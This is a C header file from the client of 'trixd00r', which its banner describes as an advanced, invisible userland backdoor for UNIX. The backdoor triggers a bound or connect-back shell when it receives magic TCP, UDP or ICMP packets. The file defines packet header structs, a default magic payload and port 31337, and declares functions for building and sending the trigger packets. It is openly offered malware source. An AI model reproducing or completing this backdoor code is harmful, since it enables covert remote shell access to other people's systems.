/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/inc/packet.h                                                         *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/


#ifndef __PACKET_H__
#define __PACKET_H__


#define _BSD_SOURCE 1   /* bsd style API */
#define __FAVOR_BSD 1


#include <sys/types.h>
#include <netinet/in.h>


/* default values */
#define DEF_TYPE    _TCP_SYN_TYPE   /* packet/protocol type */
#define DEF_PAYLOAD "opensesame"    /* default magic payload */
#define DEF_PORT    31337           /* default port to connect/listen */


/* packet type descriptions */
#define TCP_SYN_TYPE    "TCP SYN"
#define TCP_ACK_TYPE    "TCP ACK"
#define TCP_RST_TYPE    "TCP RST"
#define TCP_PSH_TYPE    "TCP PSH"
#define TCP_URG_TYPE    "TCP URG"
#define TCP_FIN_TYPE    "TCP FIN"
#define UDP_TYPE        "UDP"
#define ICMP_ECHO_TYPE  "ICMP"


/* needed tcp flags */
#define TH_FIN  0x01    /* TCP FIN flag */
#define TH_SYN  0x02    /* TCP SYN flag */
#define TH_RST  0x04    /* TCP RST flag */
#define TH_PSH  0x08    /* TCP PUSH flag */
#define TH_ACK  0x10    /* TCP ACK flag */
#define TH_URG  0x20    /* TCP URG flag */


/* ip header */
typedef struct {
    unsigned int ver:4;         /* version */
    unsigned int ihl:4;         /* header len */
    uint8_t tos;                /* type of service */
    unsigned short len;         /* total length */
    unsigned short id;          /* identification */
    unsigned short off;         /* fragment offset field */
    uint8_t ttl;                /* time to live */
    uint8_t p;                  /* protocol */
    unsigned short sum;         /* checksum */
    struct in_addr src, dst;    /* source and dest address */
} ip_t;


/* tcp header */
typedef struct {
    uint16_t sport;         /* source port */
    uint16_t dport;         /* destination port */
    uint32_t seq;           /* sequence number */
    uint32_t ack;           /* acknowledgement number */
    uint32_t x2:4;          /* unused */
    uint32_t off:4;         /* data offset */
    uint8_t flags;          /* tcp flags */
    uint16_t win;           /* window */
    uint16_t sum;           /* checksum */
    uint16_t urp;           /* urgent pointer */
} tcp_t;


/* udp header */
typedef struct {
    uint16_t sport;         /* source port */
    uint16_t dport;         /* destination port */
    uint16_t len;           /* udp length */
    uint16_t sum;           /* udp checksum */
} udp_t;


/* our magic packet and settings */
typedef struct {
    int one;                    /* for setsockopt() raw socket */
    int lfd;                    /* listen socket descriptor */
    int cfd;                    /* connect socket descriptor */
    struct sockaddr_in srv;     /* server */
    struct sockaddr_in cli;     /* client */
    socklen_t len;              /* len of sockaddr_in {} */
    ip_t *ip;                   /* ip header */
    tcp_t *tcp;                 /* tcp header */
    udp_t *udp;                 /* udp header */
    long int hdrlen;            /* either tcp, udp or icmp (sizeof) */
    char *host;                 /* trixd00rd host */
    char *magic_packet;         /* magic packet */
    unsigned char type;         /* magic packet type */
    char *payload;              /* magic payload */
    uint16_t port;              /* port to connect or listen */
    unsigned char verbose;      /* see controller.h */
} packet_t;


/* packet types */
enum {
    _TCP_SYN_TYPE = 0, _TCP_ACK_TYPE, _TCP_RST_TYPE, _TCP_PSH_TYPE,
    _TCP_URG_TYPE, _TCP_FIN_TYPE, _UDP_TYPE, _NUM_PKT_TYPES
};


/* icmp header */
typedef struct {
    int dummy;
} icmp_t;


/* print out supported magic packet types and protocol */
void print_packet_types();


/* send our magic packet */
void send_packet(packet_t *);


/* build our magic packet */
void build_packet(packet_t *);


#endif

/* EOF */
